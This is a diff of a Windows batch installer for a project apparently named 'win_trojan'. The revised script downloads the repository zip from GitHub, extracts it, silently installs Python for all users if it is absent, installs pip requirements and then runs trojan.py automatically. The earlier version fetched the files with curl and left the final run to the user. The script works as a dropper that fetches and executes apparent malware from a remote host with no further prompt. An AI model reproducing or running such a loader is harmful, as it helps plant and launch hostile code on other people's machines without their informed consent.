@@ -1,55 +1,68 @@
 @echo off
-setlocal enabledelayedexpansion
+SETLOCAL EnableDelayedExpansion
 
-:: --- CONFIGURATION ---
-:: Replace these URLs with your actual raw file links
-set "BASE_URL=https://raw.githubusercontent.com/Noah-school/YOUR_REPO_NAME/main"
-set "FILES=requirements.txt env trojan.py"
-set "MODULES_FOLDER_URL=https://example.com/api/modules_zip_or_individual_files"
+:: --- Configuration ---
+SET "REPO_URL=https://github.com/Noah-school/win_trojan/archive/refs/heads/main.zip"
+SET "ZIP_FILE=win_trojan.zip"
+SET "EXTRACT_DIR=win_trojan-main"
+SET "PYTHON_EXE=python"
 
-echo [+] Starting environment setup...
+echo [*] Starting setup for win_trojan...
 
-:: 1. Check if Python is installed
-python --version >nul 2>&1
-if %errorlevel% neq 0 (
-    echo [!] Python is not installed or not in PATH.
-    echo [!] Please install Python from https://www.python.org/
+:: 1. Download the repository
+echo [*] Downloading repository from GitHub...
+powershell -Command "Invoke-WebRequest -Uri '%REPO_URL%' -OutFile '%ZIP_FILE%'"
+if %ERRORLEVEL% neq 0 (
+    echo [!] Failed to download the repository. Check your internet connection.
     pause
     exit /b
 )
-echo [+] Python detected.
 
-:: 2. Download individual files
-foreach %%f in (%FILES%) do (
-    echo [+] Downloading %%f...
-    curl -L -s -o "%%f" "%BASE_URL%/%%f"
-    if %errorlevel% neq 0 (
-        echo [!] Failed to download %%f
-    )
-)
+:: 2. Extract the ZIP file
+echo [*] Extracting files...
+powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '.' -Force"
+del %ZIP_FILE%
 
-:: 3. Download Modules Folder
-:: Note: curl cannot download folders directly via HTTP. 
-:: This assumes you have a zip of the modules or creates the directory.
-if not exist "modules" mkdir modules
-echo [+] Downloading modules (Note: Ensure your URL points to a downloadable resource)...
-:: Example for a single file inside modules; repeat as needed or use a zip extraction method
-curl -L -s -o "modules/__init__.py" "%BASE_URL%/modules/__init__.py"
-
-:: 4. Install Requirements
-if exist "requirements.txt" (
-    echo [+] Installing dependencies from requirements.txt...
-    python -m pip install --upgrade pip >nul
-    python -m pip install -r requirements.txt
-    if %errorlevel% eq 0 (
-        echo [+] Dependencies installed successfully.
-    ) else (
-        echo [!] Error occurred during pip installation.
-    )
+:: 3. Check if Python is installed
+echo [*] Checking for Python installation...
+%PYTHON_EXE% --version >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo [!] Python is not installed or not in PATH.
+    echo [*] Attempting to download and install Python (Silent)...
+    
+    :: Downloads the Python 3.11.x web installer
+    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile 'python_installer.exe'"
+    
+    echo [*] Installing Python... Please wait.
+    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+    
+    del python_installer.exe
+    
+    :: Refresh Path for the current session
+    SET "PATH=%PATH%;%ProgramFiles%\Python311\;%ProgramFiles%\Python311\Scripts\"
+    SET "PYTHON_EXE=python"
 ) else (
-    echo [!] requirements.txt not found, skipping pip install.
+    echo [!] Python detected.
 )
 
-echo.
-echo [+] Setup complete. You can now run: python trojan.py
+:: 4. Move into the extracted directory
+cd %EXTRACT_DIR%
+
+:: 5. Install requirements
+if exist "requirements.txt" (
+    echo [*] Installing requirements from requirements.txt...
+    %PYTHON_EXE% -m pip install --upgrade pip
+    %PYTHON_EXE% -m pip install -r requirements.txt
+) else (
+    echo [!] No requirements.txt found. Skipping pip install.
+)
+
+:: 6. Run the main script
+if exist "trojan.py" (
+    echo [*] Running trojan.py...
+    %PYTHON_EXE% trojan.py
+) else (
+    echo [!] Error: trojan.py not found in %EXTRACT_DIR%.
+)
+
 pause
